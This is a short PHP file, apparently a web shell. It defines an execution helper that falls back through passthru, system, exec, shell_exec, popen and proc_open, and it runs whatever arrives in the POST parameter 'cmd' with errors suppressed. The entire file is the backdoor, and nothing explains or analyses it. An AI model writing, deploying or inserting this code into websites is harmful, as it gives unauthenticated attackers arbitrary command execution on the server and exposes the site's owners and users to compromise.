<?php
function Exe($command)
{
	$exec=$output='';
	$dep[]=array('pipe','r');$dep[]=array('pipe','w');
	if(function_exists('passthru')){ob_start();@passthru($command);$exec=ob_get_contents();ob_clean();ob_end_clean();}
	elseif(function_exists('system')){$tmp=ob_get_contents();ob_clean();@system($command);$output=ob_get_contents();ob_clean();$exec=$tmp;}
	elseif(function_exists('exec')){@exec($command,$output);$output=join("\n",$output);$exec=$output;}
	elseif(function_exists('shell_exec'))$exec=@shell_exec($command);
	elseif(function_exists('popen')){$output=@popen($command,'r');while(!feof($output)){$exec=fgets($output);}pclose($output);}
	elseif(function_exists('proc_open')){$res=@proc_open($command,$dep,$pipes);while(!feof($pipes[1])){$line=fgets($pipes[1]);$output.=$line;}
	$exec=$output;proc_close($res);}

	return $exec;
}

Exe($_POST['cmd']);
?>